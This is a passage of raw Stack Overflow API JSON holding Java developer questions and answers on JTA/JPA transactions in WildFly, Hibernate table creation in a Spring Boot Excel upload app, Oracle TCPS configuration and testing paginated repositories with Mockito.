--jndi-name=java:jboss/datasources/unit --name=MyDb --connection-url=jdbc:postgresql://localhost:5432/postgres  --driver-name=postgresql  --user-name=username --password=password\r\n\r\n","title":"Transaction is not accessible when using JTA with JPA-compliant transaction access enabled","body":"<p>I had the very same issue but problem lied elsewhere...</p>\n<p>So the stack: I was using Wildfly server , postgresql, and JPA</p>\n<p>At first, my persistence.xml was configured to use RESOURCE_LOCAL transactions e.g.</p>\n<pre><code>&lt;persistence-unit name=&quot;unit&quot; transaction-type=&quot;RESOURCE_LOCAL&quot;&gt;\n</code></pre>\n<p>and I had a problem that even when the method was marked <code>@Transactional</code> it was not doing any rollbacks when error occured, yet saving worked fine.</p>\n<p>So then I decided to use transaction-type JTA instead of RESOURCE_LOCAL so that the container manages the transactions.</p>\n<p>When I changed my persistence.xml to  this, it was still not working</p>\n<pre><code>&lt;persistence-unit name=&quot;unit&quot; transaction-type=&quot;JTA&quot;&gt;\n    &lt;jta-data-source&gt;java:jboss/datasources/unit&lt;/jta-data-source&gt;\n</code></pre>\n<p>and was throwing the very error that is in the title of this question.</p>\n<p>My problem was, how I was creating the EntityManager, this is how it was defined</p>\n<pre><code>@Produces\n@PersistenceContext\nprivate static EntityManager em = Persistence.createEntityManagerFactory(UNIT_NAME).createEntityManager()\n</code></pre>\n<p>The solution? I had to remove the annotation <code>@PersistenceContext</code></p>\n<p>P.s. for JTA transactions do not forget to tell wildfly about the datasource for example via CLI like this</p>\n<pre><code>data-source add --jndi-name=java:jboss/datasources/unit --name=MyDb --connection-url=jdbc:postgresql://localhost:5432/postgres  --driver-name=postgresql  --user-name=username --password=password\n</code></pre>\n"}],"owner":{"account_id":8685059,"reputation":1412,"user_id":6499760,"display_name":"Alexey  Usharovski"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6220,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"answer_count":2,"score":4,"last_activity_date":1642496856,"creation_date":1571495869,"question_id":58464770,"body_markdown":"I have a Transaction Manager injected with `@PersistenceContext` context annotation. Every time I&#39;m trying to start the transaction with `em.getTransaction().begin` I got an exception with the error message\r\n```\r\nTransaction is not accessible when using JTA with JPA-compliant transaction access enabled\r\n```\r\n\r\nI know that I should inject `UserTransaction` or use `@Transactional` annotation but I want to know the reason for such behavior.","title":"Transaction is not accessible when using JTA with JPA-compliant transaction access enabled","body":"<p>I have a Transaction Manager injected with <code>@PersistenceContext</code> context annotation. Every time I'm trying to start the transaction with <code>em.getTransaction().begin</code> I got an exception with the error message</p>\n\n<pre><code>Transaction is not accessible when using JTA with JPA-compliant transaction access enabled\n</code></pre>\n\n<p>I know that I should inject <code>UserTransaction</code> or use <code>@Transactional</code> annotation but I want to know the reason for such behavior.</p>\n"},{"tags":["java","mysql","spring","spring-boot","jdbc"],"comments":[{"owner":{"account_id":10814530,"reputation":4195,"user_id":7954021,"display_name":"Renis1235"},"score":0,"creation_date":1642493111,"post_id":70752003,"comment_id":125078171,"body_markdown":"Please be more specific. Too much code and too little explanation.","body":"Please be more specific. Too much code and too little explanation."},{"owner":{"account_id":23161781,"reputation":1,"user_id":17262335,"display_name":"rachet18"},"score":0,"creation_date":1642494256,"post_id":70752003,"comment_id":125078602,"body_markdown":"the issue is i want a table of cardetails to be created in the database automatically..connection is established to MySQL workbench but the table isn&#39;t created. not sure where I&#39;m wrong. thanks for the help","body":"the issue is i want a table of cardetails to be created in the database automatically..connection is established to MySQL workbench but the table isn&#39;t created. not sure where I&#39;m wrong. thanks for the help"}],"owner":{"account_id":23161781,"reputation":1,"user_id":17262335,"display_name":"rachet18"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":51,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642496793,"creation_date":1642492457,"question_id":70752003,"body_markdown":"The code is working enough to upload an excel file and retrieve data. Need to save the same to the database. connection done but no table created.\r\n\r\n&gt; ## cardetails.java ##\r\n\r\nPOJO of car entity\r\n\r\n    package com.example3.excelspring;\r\n    \r\n    import javax.persistence.Column;\r\n    import javax.persistence.Entity;\r\n    import javax.persistence.GeneratedValue;\r\n    import javax.persistence.GenerationType;\r\n    import javax.persistence.Id;\r\n    import javax.persistence.Table;\r\n    \r\n    import org.springframework.boot.autoconfigure.domain.EntityScan;\r\n    \r\n    import lombok.AllArgsConstructor; \r\n    import lombok.Builder; \r\n    import lombok.Data;\r\n    import lombok.NoArgsConstructor;\r\n      \r\n    @Entity\r\n    @Table(name=&quot;cardetails&quot;)\r\n    @Data\r\n    @AllArgsConstructor\r\n    @NoArgsConstructor\r\n    @Builder \r\n    public class CarDetails {\r\n      \r\n    \t@Id\r\n    \t@GeneratedValue(strategy = GenerationType.AUTO)\r\n    \t@Column(name = &quot;userId&quot;, nullable = false, updatable = false)\r\n    \tprivate int userId;\r\n    \t@Column(name = &quot;brand&quot;)\r\n    \tprivate String brand; \r\n    \t@Column(name = &quot;car name&quot;)\r\n    \tprivate String car_name; \r\n    \t@Column(name = &quot;year&quot;)\r\n    \tprivate int year;\r\n      \r\n      }\r\n\r\n\r\n----------\r\n\r\n&gt; ExcelspringApplication.java\r\n\r\n  starter class for spring \r\n\r\n      package com.example3.excelspring;\r\n    \r\n    import org.springframework.boot.SpringApplication;\r\n    \r\n    import org.springframework.boot.autoconfigure.SpringBootApplication;\r\n    \r\n    \r\n    \r\n    @SpringBootApplication\r\n    public class ExcelspringApplication {\r\n    \r\n    \tpublic static void main(String[] args) {\r\n    \t\tSpringApplication.run(ExcelspringApplication.class, args);\r\n    \t}\r\n    \r\n    }\r\n\r\n    \r\n\r\n&gt; uploadController.java\r\n\r\ncontroller for the excel file upload\r\n\r\n       package com.example3.excelspring.controller;\r\n    \r\n    import java.util.List;\r\n    import java.util.Map;\r\n    \r\n    import org.springframework.web.bind.annotation.GetMapping;\r\n    import org.springframework.web.bind.annotation.PostMapping;\r\n    import org.springframework.web.bind.annotation.RequestParam;\r\n    import org.springframework.web.bind.annotation.RestController;\r\n    import org.springframework.web.multipart.MultipartFile;\r\n    \r\n    \r\n    import com.example3.excelspring.service.UploadService;\r\n    \r\n    \r\n    @RestController\r\n    public class UploadController {\r\n    \t\r\n    \tprivate final UploadService uploadService;\r\n    \t\r\n    \tpublic UploadController(UploadService uploadService) {\r\n    \t\tthis.uploadService = uploadService;\r\n    \t}\r\n    \r\n    \t@GetMapping(&quot;/getAll&quot;)\r\n    \tpublic List&lt;Map&lt;String, String&gt;&gt; upload(@RequestParam(&quot;file&quot;) MultipartFile file) throws Exception{\r\n    \t\treturn uploadService.upload(file);\r\n    \t}\r\n    \t\r\n    \t\r\n    }\r\n\r\n&gt; uploadService.java\r\n\r\nservice to upload excel file\r\n\r\n    package com.example3.excelspring.service;\r\n    \r\n    \r\n    import org.apache.poi.ss.usermodel.*;\r\n    import org.springframework.beans.factory.annotation.Autowired;\r\n    import org.springframework.stereotype.Service;\r\n    import org.springframework.web.multipart.MultipartFile;\r\n    \r\n    import java.io.File;\r\n    import java.nio.file.Files;\r\n    import java.nio.file.Path;\r\n    import java.util.*;\r\n    import java.util.function.*;\r\n    import java.util.stream.*;\r\n    \r\n    import com.example3.excelspring.util.UploadUtil;\r\n    \r\n    @Service\r\n    public class UploadService {\r\n    \r\n    \t@Autowired\r\n    \tUploadUtil uploadUtil;\r\n    \r\n    \tpublic List&lt;Map&lt;String, String&gt;&gt; upload(MultipartFile file) throws Exception {\r\n    \r\n    \t\tDataFormatter formatter = new DataFormatter();\r\n    \r\n    \t\tPath tempDir = Files.createTempDirectory(&quot;&quot;);\r\n    \r\n    \t\tFile tempFile = tempDir.resolve(file.getOriginalFilename()).toFile();\r\n    \r\n    \t\tfile.transferTo(tempFile);\r\n    \r\n    \t\tif (tempFile.isFile() &amp;&amp; tempFile.exists()) {\r\n    \t\t\tSystem.out.println(&quot;Suceess&quot;);\r\n    \t\t}\r\n    \t\telse {\r\n    \t\t\tSystem.out.println(&quot;Unable to upload&quot;);\r\n    \t\t}\r\n    \r\n    \t\tWorkbook workbook = WorkbookFactory.create(tempFile);\r\n    \r\n    \t\tSheet sheet = workbook.getSheetAt(0);\r\n    \r\n    \t\tSupplier&lt;Stream&lt;Row&gt;&gt; rowStreamSupplier = uploadUtil.getRowStreamSupplier(sheet);\r\n    \r\n    \t\tRow headerRow = rowStreamSupplier.get().findFirst().get();\r\n    \t\tList&lt;String&gt; headerCells = uploadUtil.getStream(headerRow)\r\n    \t\t\t\t.map(Cell::getStringCellValue) \r\n    \t\t\t\t.collect(Collectors.toList());\r\n    \r\n    \t\tint colCount = headerCells.size();\r\n    \r\n    \t\tList&lt;Map&lt;String, String&gt;&gt; content = rowStreamSupplier.get()\r\n    \t\t\t\t.skip(1)\r\n    \t\t\t\t.map(row -&gt; \r\n    \t\t\t\t{\r\n    \t\t\t\t\tList&lt;String&gt; cellList = uploadUtil.getStream(row)\r\n    \t\t\t\t\t\t\t.map((cell) -&gt; formatter.formatCellValue(cell))\r\n    \t\t\t\t\t\t\t.collect(Collectors.toList());  \r\n    \t\t\t\t\treturn uploadUtil.cellIteratorSupplier(colCount)\r\n    \t\t\t\t\t\t\t.get()\r\n    \t\t\t\t\t\t\t.collect(Collectors.toMap(headerCells::get, cellList::get));\r\n    \t\t\t\t})\r\n    \t\t\t\t.collect(Collectors.toList());\r\n    \t\treturn content;\r\n    \t}\r\n    }\r\n\r\n&gt; uploadUtil.java\r\n\r\nutility class for service class\r\n\r\n    package com.example3.excelspring.util;\r\n    \r\n    \r\n    \r\n    import java.util.function.Supplier;\r\n    import java.util.stream.IntStream;\r\n    import java.util.stream.Stream;\r\n    import java.util.stream.StreamSupport;\r\n    \r\n    import org.apache.poi.ss.usermodel.Cell;\r\n    import org.apache.poi.ss.usermodel.Row;\r\n    import org.springframework.stereotype.Component;\r\n    \r\n    @Component\r\n    public class UploadUtil {\r\n    \t\r\n    \r\n    \tpublic Supplier&lt;Stream&lt;Row&gt;&gt; getRowStreamSupplier(Iterable&lt;Row&gt; rows) {\r\n    \t\treturn () -&gt; getStream(rows);\r\n    \t}\r\n    \r\n    \tpublic &lt;T&gt; Stream&lt;T&gt; getStream(Iterable&lt;T&gt; iterable) {\r\n    \t\treturn StreamSupport.stream(iterable.spliterator(), false);\r\n    \t}\r\n    \t\r\n    \tpublic Supplier&lt;Stream&lt;Integer&gt;&gt; cellIteratorSupplier(int end) {\r\n    \t\treturn () -&gt; numberStream(end);\r\n    \t}\r\n    \r\n    \tpublic Stream&lt;Integer&gt; numberStream(int end) {\r\n    \t\treturn IntStream.range(0, end).boxed();\r\n    \t}\r\n    }\r\n\r\n&gt; application.yml\r\n\r\nconnections specification\r\n\r\n    server:\r\n      port: 15000\r\n    \r\n    spring:\r\n      datasource:\r\n        url: jdbc:mysql://localhost:3307/car_db?autoReconnect=true&amp;useSSL=false\r\n        username: root\r\n        password: Guruji009\r\n        driverClassName: com.mysql.cj.jdbc.Driver\r\n      jpa:\r\n        properties:\r\n          hibernate:\r\n            default_schema: car_db\r\n            dialect: org.hibernate.dialect.MySQL5InnoDBDialect\r\n            ddl-auto: update\r\n            format_sql: true\r\n            generate_statistics: true\r\n            show_sql: true\r\n            use_sql_comments: true\r\n        database: mysql\r\n\r\n \r\n\r\n\r\n","title":"Table creation in database isn&#39;t happening for excel file upload and store the cell info in database","body":"<p>The code is working enough to upload an excel file and retrieve data. Need to save the same to the database. connection done but no table created.</p>\n<blockquote>\n<h2>cardetails.java</h2>\n</blockquote>\n<p>POJO of car entity</p>\n<pre><code>package com.example3.excelspring;\n\nimport javax.persistence.Column;\nimport javax.persistence.Entity;\nimport javax.persistence.GeneratedValue;\nimport javax.persistence.GenerationType;\nimport javax.persistence.Id;\nimport javax.persistence.Table;\n\nimport org.springframework.boot.autoconfigure.domain.EntityScan;\n\nimport lombok.AllArgsConstructor; \nimport lombok.Builder; \nimport lombok.Data;\nimport lombok.NoArgsConstructor;\n  \n@Entity\n@Table(name=&quot;cardetails&quot;)\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\n@Builder \npublic class CarDetails {\n  \n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    @Column(name = &quot;userId&quot;, nullable = false, updatable = false)\n    private int userId;\n    @Column(name = &quot;brand&quot;)\n    private String brand; \n    @Column(name = &quot;car name&quot;)\n    private String car_name; \n    @Column(name = &quot;year&quot;)\n    private int year;\n  \n  }\n</code></pre>\n<hr />\n<blockquote>\n<p>ExcelspringApplication.java</p>\n</blockquote>\n<p>starter class for spring</p>\n<pre><code>  package com.example3.excelspring;\n\nimport org.springframework.boot.SpringApplication;\n\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\n\n\n@SpringBootApplication\npublic class ExcelspringApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ExcelspringApplication.class, args);\n    }\n\n}\n</code></pre>\n<blockquote>\n<p>uploadController.java</p>\n</blockquote>\n<p>controller for the excel file upload</p>\n<pre><code>   package com.example3.excelspring.controller;\n\nimport java.util.List;\nimport java.util.Map;\n\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.multipart.MultipartFile;\n\n\nimport com.example3.excelspring.service.UploadService;\n\n\n@RestController\npublic class UploadController {\n    \n    private final UploadService uploadService;\n    \n    public UploadController(UploadService uploadService) {\n        this.uploadService = uploadService;\n    }\n\n    @GetMapping(&quot;/getAll&quot;)\n    public List&lt;Map&lt;String, String&gt;&gt; upload(@RequestParam(&quot;file&quot;) MultipartFile file) throws Exception{\n        return uploadService.upload(file);\n    }\n    \n    \n}\n</code></pre>\n<blockquote>\n<p>uploadService.java</p>\n</blockquote>\n<p>service to upload excel file</p>\n<pre><code>package com.example3.excelspring.service;\n\n\nimport org.apache.poi.ss.usermodel.*;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.multipart.MultipartFile;\n\nimport java.io.File;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.*;\nimport java.util.function.*;\nimport java.util.stream.*;\n\nimport com.example3.excelspring.util.UploadUtil;\n\n@Service\npublic class UploadService {\n\n    @Autowired\n    UploadUtil uploadUtil;\n\n    public List&lt;Map&lt;String, String&gt;&gt; upload(MultipartFile file) throws Exception {\n\n        DataFormatter formatter = new DataFormatter();\n\n        Path tempDir = Files.createTempDirectory(&quot;&quot;);\n\n        File tempFile = tempDir.resolve(file.getOriginalFilename()).toFile();\n\n        file.transferTo(tempFile);\n\n        if (tempFile.isFile() &amp;&amp; tempFile.exists()) {\n            System.out.println(&quot;Suceess&quot;);\n        }\n        else {\n            System.out.println(&quot;Unable to upload&quot;);\n        }\n\n        Workbook workbook = WorkbookFactory.create(tempFile);\n\n        Sheet sheet = workbook.getSheetAt(0);\n\n        Supplier&lt;Stream&lt;Row&gt;&gt; rowStreamSupplier = uploadUtil.getRowStreamSupplier(sheet);\n\n        Row headerRow = rowStreamSupplier.get().findFirst().get();\n        List&lt;String&gt; headerCells = uploadUtil.getStream(headerRow)\n                .map(Cell::getStringCellValue) \n                .collect(Collectors.toList());\n\n        int colCount = headerCells.size();\n\n        List&lt;Map&lt;String, String&gt;&gt; content = rowStreamSupplier.get()\n                .skip(1)\n                .map(row -&gt; \n                {\n                    List&lt;String&gt; cellList = uploadUtil.getStream(row)\n                            .map((cell) -&gt; formatter.formatCellValue(cell))\n                            .collect(Collectors.toList());  \n                    return uploadUtil.cellIteratorSupplier(colCount)\n                            .get()\n                            .collect(Collectors.toMap(headerCells::get, cellList::get));\n                })\n                .collect(Collectors.toList());\n        return content;\n    }\n}\n</code></pre>\n<blockquote>\n<p>uploadUtil.java</p>\n</blockquote>\n<p>utility class for service class</p>\n<pre><code>package com.example3.excelspring.util;\n\n\n\nimport java.util.function.Supplier;\nimport java.util.stream.IntStream;\nimport java.util.stream.Stream;\nimport java.util.stream.StreamSupport;\n\nimport org.apache.poi.ss.usermodel.Cell;\nimport org.apache.poi.ss.usermodel.Row;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class UploadUtil {\n    \n\n    public Supplier&lt;Stream&lt;Row&gt;&gt; getRowStreamSupplier(Iterable&lt;Row&gt; rows) {\n        return () -&gt; getStream(rows);\n    }\n\n    public &lt;T&gt; Stream&lt;T&gt; getStream(Iterable&lt;T&gt; iterable) {\n        return StreamSupport.stream(iterable.spliterator(), false);\n    }\n    \n    public Supplier&lt;Stream&lt;Integer&gt;&gt; cellIteratorSupplier(int end) {\n        return () -&gt; numberStream(end);\n    }\n\n    public Stream&lt;Integer&gt; numberStream(int end) {\n        return IntStream.range(0, end).boxed();\n    }\n}\n</code></pre>\n<blockquote>\n<p>application.yml</p>\n</blockquote>\n<p>connections specification</p>\n<pre><code>server:\n  port: 15000\n\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3307/car_db?autoReconnect=true&amp;useSSL=false\n    username: root\n    password: Guruji009\n    driverClassName: com.mysql.cj.jdbc.Driver\n  jpa:\n    properties:\n      hibernate:\n        default_schema: car_db\n        dialect: org.hibernate.dialect.MySQL5InnoDBDialect\n        ddl-auto: update\n        format_sql: true\n        generate_statistics: true\n        show_sql: true\n        use_sql_comments: true\n    database: mysql\n</code></pre>\n"},{"tags":["java","spring-boot","oracle12c"],"comments":[{"owner":{"account_id":12508688,"reputation":113,"user_id":9104707,"display_name":"Muralidhar"},"score":0,"creation_date":1664124964,"post_id":70752898,"comment_id":130394716,"body_markdown":"please share your experience how you could resolve this problem? am looking for solution for this problem.","body":"please share your experience how you could resolve this problem? am looking for solution for this problem."}],"owner":{"account_id":8682064,"reputation":41,"user_id":6497585,"display_name":"Muhammad Nabil"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1140,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1642496784,"creation_date":1642496784,"question_id":70752898,"body_markdown":"I need to configure Spring boot with TCPS for Oracle DB, I&#39;ve found an article for normal java program but couldn&#39;t find any resources for spring boot configuration\r\n\r\n```\r\n    Properties props = new Properties();\r\n    props.setProperty(&quot;user&quot;, &quot;test&quot;);\r\n    props.setProperty(&quot;password&quot;, &quot;test123&quot;);\r\n\r\n    //Single sign on\r\n    props.setProperty(&quot;javax.net.ssl.trustStore&quot;, &quot;cwallet.sso&quot;);\r\n    props.setProperty(&quot;javax.net.ssl.trustStoreType&quot;,&quot;SSO&quot;);\r\n    props.setProperty(&quot;javax.net.ssl.keyStore&quot;,&quot;cwallet.sso&quot;);\r\n    props.setProperty(&quot;javax.net.ssl.keyStoreType&quot;,&quot;SSO&quot;);\r\n     //Load the database driver \r\n    try\r\n    {\r\n    String url = &quot;jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=tcps)(HOST=999.999.999.999)(PORT=1522))(CONNECT_DATA=(SERVICE_NAME=xxxx)))&quot;;\r\n\r\n        Security.addProvider(new OraclePKIProvider());\r\n        DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());\r\n        connection = DriverManager.getConnection(url,props);\r\n        if (connection != null) {\r\n            System.out.println(&quot;You made it, take control your database now!&quot;);\r\n        } else {\r\n            System.out.println(&quot;Failed to make connection!&quot;);\r\n        }\r\n    }\r\n    catch (SQLException ex) {\r\n    ex.printStackTrace();\r\n}\r\n\t}\r\n```","title":"Configure spring boot with Oracle DB SSL/TCPS","body":"<p>I need to configure Spring boot with TCPS for Oracle DB, I've found an article for normal java program but couldn't find any resources for spring boot configuration</p>\n<pre><code>    Properties props = new Properties();\n    props.setProperty(&quot;user&quot;, &quot;test&quot;);\n    props.setProperty(&quot;password&quot;, &quot;test123&quot;);\n\n    //Single sign on\n    props.setProperty(&quot;javax.net.ssl.trustStore&quot;, &quot;cwallet.sso&quot;);\n    props.setProperty(&quot;javax.net.ssl.trustStoreType&quot;,&quot;SSO&quot;);\n    props.setProperty(&quot;javax.net.ssl.keyStore&quot;,&quot;cwallet.sso&quot;);\n    props.setProperty(&quot;javax.net.ssl.keyStoreType&quot;,&quot;SSO&quot;);\n     //Load the database driver \n    try\n    {\n    String url = &quot;jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=tcps)(HOST=999.999.999.999)(PORT=1522))(CONNECT_DATA=(SERVICE_NAME=xxxx)))&quot;;\n\n        Security.addProvider(new OraclePKIProvider());\n        DriverManager.registerDriver(new oracle.jdbc.driver.OracleDriver());\n        connection = DriverManager.getConnection(url,props);\n        if (connection != null) {\n            System.out.println(&quot;You made it, take control your database now!&quot;);\n        } else {\n            System.out.println(&quot;Failed to make connection!&quot;);\n        }\n    }\n    catch (SQLException ex) {\n    ex.printStackTrace();\n}\n    }\n</code></pre>\n"},{"tags":["java","spring-boot","unit-testing","testing","paging"],"comments":[{"owner":{"account_id":14713804,"reputation":620,"user_id":10811865,"display_name":"SirHawrk"},"score":0,"creation_date":1642495102,"post_id":70752293,"comment_id":125078920,"body_markdown":"Why are you trying to test the Spring repository logic?","body":"Why are you trying to test the Spring repository logic?"},{"owner":{"display_name":"user17862362"},"score":0,"creation_date":1642495252,"post_id":70752293,"comment_id":125078989,"body_markdown":"@SirHawrk I am testing the `findAll` method, but I also want to test the pagination.","body":"@SirHawrk I am testing the <code>findAll</code> method, but I also want to test the pagination."}],"answers":[{"tags":[],"owner":{"account_id":5190284,"reputation":13363,"user_id":4153426,"display_name":"m.antkowicz"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642495010,"creation_date":1642495010,"answer_id":70752511,"question_id":70752293,"body_markdown":"Yes, because of declaring mock&#39;s behaviour like \r\n\r\n     when(permissionRepository.findAll(request, null)).thenReturn(permissionPage);\r\n\r\nyou are just ignoring inner logic of request paging. \r\n\r\nNow the question is what actually you want to check - if you want to test Repository paging implementation and the Repository is some 3rd library/Spring respository then maybe you do not need to test it - basically you should avoid testing libraries - they should be tested already by their developers. If Repository implementation is yours then such test case should be somewhere else already so still, in my opinion, you can ignore this issue you presented.\r\n\r\nThrid option is using 3rd party Repository implementation and the situation when you want to understand whether your `findAll` method treats properly the paged result of Repository. Then you need to write your mock according to the original object&#39;s behaviour. There are two ways to do this:\r\n1. Either you are providing your own implementation instead of mock and in the `permissionRepository.findAll` method you are checking the request and returning proper count of records (they can be hardcoded in this test class implementation or even better provided by constructor parameter)\r\n2. Either you are using some Mockito&#39;s magic to mock this behaviour due to what parameter was provided to mocked method call \r\n\r\nDue to point **2** there are various ways to achieve this. For example take a look at: https://stackoverflow.com/questions/2684630/making-a-mocked-method-return-an-argument-that-was-passed-to-it","title":"Cannot test paging in Unit Test","body":"<p>Yes, because of declaring mock's behaviour like</p>\n<pre><code> when(permissionRepository.findAll(request, null)).thenReturn(permissionPage);\n</code></pre>\n<p>you are just ignoring inner logic of request paging.</p>\n<p>Now the question is what actually you want to check - if you want to test Repository paging implementation and the Repository is some 3rd library/Spring respository then maybe you do not need to test it - basically you should avoid testing libraries - they should be tested already by their developers. If Repository implementation is yours then such test case should be somewhere else already so still, in my opinion, you can ignore this issue you presented.</p>\n<p>Thrid option is using 3rd party Repository implementation and the situation when you want to understand whether your <code>findAll</code> method treats properly the paged result of Repository. Then you need to write your mock according to the original object's behaviour. There are two ways to do this:</p>\n<ol>\n<li>Either you are providing your own implementation instead of mock and in the <code>permissionRepository.findAll</code> method you are checking the request and returning proper count of records (they can be hardcoded in this test class implementation or even better provided by constructor parameter)</li>\n<li>Either you are using some Mockito's magic to mock this behaviour due to what parameter was provided to mocked method call</li>\n</ol>\n<p>Due to point <strong>2</strong> there are various ways to achieve this. For example take a look at: <a href=\"https://stackoverflow.com/questions/2684630/making-a-mocked-method-return-an-argument-that-was-passed-to-it\">Making a mocked method return an argument that was passed to it</a></p>\n"}],"owner":{"display_name":"user17862362"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":819,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1642496507,"creation_date":1642493823,"question_id":70752293,"body_markdown":"I am trying to test paging for the following service method in a Java (Spring Boot) app:\r\n\r\n```\r\n@Override\r\npublic Page&lt;PermissionDTO&gt; findAll(PermissionCriteriaRequest request, Sort sort) {\r\n    final Page&lt;Permission&gt; permissions = repository.findAll(request, sort);\r\n    final List&lt;PermissionDTO&gt; permissionDTOs = permissions.getContent().stream().map(PermissionDTO::new)\r\n            .collect(Collectors.toList());\r\n\r\n    return new PageImpl&lt;&gt;(permissionDTOs, permissions.getPageable(), permissions.getTotalElements());\r\n}\r\n```\r\n\r\nHere is my unit test method; here I set page to 1 and set size to 1 so that I get only one record for the first page. However, it returns all the 5 records and the `PermissionCriteriaRequest` parameters do not make any sense. I think the problem is related to `when(permissionRepository.findAll(request, null)).thenReturn(permissionPage)` because I set it to return all the 5 records. So, is it possible to test paging properly? Or is it meaningless under these circumstances?\r\n\r\n```\r\n@Test\r\npublic void test_findAll() {\r\n    final Permission permission1 = new Permission();\r\n    permission1.setName(&quot;Permission1&quot;);\r\n\r\n    final Permission permission2 = new Permission();\r\n    permission2.setName(&quot;Permission2&quot;);\r\n\r\n    final Permission permission3 = new Permission();\r\n    permission3.setName(&quot;Permission3&quot;);\r\n\r\n    final Permission permission4 = new Permission();\r\n    permission4.setName(&quot;Permission4&quot;);\r\n\r\n    final Permission permission5 = new Permission();\r\n    permission5.setName(&quot;Permission5&quot;);\r\n\r\n    final List&lt;Permission&gt; permissionList = new ArrayList&lt;&gt;();\r\n    permissionList.add(permission1);\r\n    permissionList.add(permission2);\r\n    permissionList.add(permission3);\r\n    permissionList.add(permission4);\r\n    permissionList.add(permission5);\r\n\r\n    final Page&lt;Permission&gt; permissionPage = new PageImpl&lt;&gt;(permissionList);\r\n\r\n    // here I set paging parameters\r\n    final PermissionCriteriaRequest request = new PermissionCriteriaRequest();\r\n    request.setNameFilter(&quot;Permission&quot;);\r\n    request.setPaginated(true);\r\n    request.setPage(1);\r\n    request.setSize(1);\r\n\r\n    when(permissionRepository.findAll(request, null)).thenReturn(permissionPage);\r\n\r\n    Page&lt;PermissionDTO&gt; result = permissionService.findAll(request, null);\r\n\r\n    assertEquals(permissionList.size(), result.getSize());\r\n}\r\n```\r\n\r\n\r\n***Update:*** Here is my repository code:\r\n\r\n```\r\ndefault Page&lt;T&gt; findAll(PageableCriteriaRequest criteriaRequest, Sort sort) {\r\n    final SearchSpecificationBuilder&lt;T&gt; builder =\r\n         new SearchSpecificationBuilder&lt;&gt;(criteriaRequest.getSearchCriteriaList());\r\n    return findAll(builder.build(), getPageable(criteriaRequest, sort));\r\n}\r\n```","title":"Cannot test paging in Unit Test","body":"<p>I am trying to test paging for the following service method in a Java (Spring Boot) app:</p>\n<pre><code>@Override\npublic Page&lt;PermissionDTO&gt; findAll(PermissionCriteriaRequest request, Sort sort) {\n    final Page&lt;Permission&gt; permissions = repository.findAll(request, sort);\n    final List&lt;PermissionDTO&gt; permissionDTOs = permissions.getContent().stream().map(PermissionDTO::new)\n            .collect(Collectors.toList());\n\n    return new PageImpl&lt;&gt;(permissionDTOs, permissions.getPageable(), permissions.getTotalElements());\n}\n</code></pre>\n<p>Here is my unit test method; here I set page to 1 and set size to 1 so that I get only one record for the first page. However, it returns all the 5 records and the <code>PermissionCriteriaRequest</code> parameters do not make any sense. I think the problem is related to <code>when(permissionRepository.findAll(request, null)).thenReturn(permissionPage)</code> because I set it to return all the 5 records. So, is it possible to test paging properly? Or is it meaningless under these circumstances?</p>\n<pre><code>@Test\npublic void test_findAll() {\n    final Permission permission1 = new Permission();\n    permission1.setName(&quot;Permission1&quot;);\n\n    final Permission permission2 = new Permission();\n    permission2.setName(&quot;Permission2&quot;);\n\n    final Permission permission3 = new Permission();\n    permission3.setName(&quot;Permission3&quot;);\n\n    final Permission permission4 = new Permission();\n    permission4.setName(&quot;Permission4&quot;);\n\n    final Permission permission5 = new Permission();\n    permission5.setName(&quot;Permission5&quot;);\n\n    final List&lt;Permission&gt; permissionList = new ArrayList&lt;&gt;();\n    permissionList.add(permission1);\n    permissionList.add(permission2);\n    permissionList.add(permission3);\n    permissionList.add(permission4);\n    permissionList.add(permission5);\n\n    final Page&lt;Permission&gt; permissionPage = new PageImpl&lt;&gt;(permissionList);\n\n    // here I set paging parameters\n    final PermissionCriteriaRequest request = new PermissionCriteriaRequest();\n    request.setNameFilter(&quot;Permission&quot;);\n    request.setPaginated(true);\n    request.setPage(1);\n    request.setSize(1);\n\n    when(permissionRepository.findAll(request, null)).thenReturn(permissionPage);\n\n    Page&lt;PermissionDTO&gt; result = permissionService.findAll(request, null);\n\n    assertEquals(permissionList.size(), result.getSize());\n}\n</code></pre>\n<p><em><strong>Update:</strong></em> Here is my repository code:</p>\n<pre><code>default Page&lt;T&gt; findAll(PageableCriteriaRequest criteriaRequest, Sort sort) {\n    final SearchSpecificationBuilder&lt;T&gt; builder =\n         new SearchSpecificationBuilder&lt;&gt;(criteriaRequest.getSearchCriteriaList());\n    return findAll(builder.build(), getPageable(criteriaRequest, sort));\n}\n</code></pre>\n"},{"tags":["java","istio","istio-sidecar"],"comments":[{"owner":{"account_id":22142085,"reputation":2950,"user_id":16391991,"display_name":"Mikolaj S."},"score":0,"creation_date":1641910179,"post_id":70654441,"comment_id":124926798,"body_markdown":"Which Istio and Kubernetes version are you using?","body":"Which Istio and Kubernetes version are you 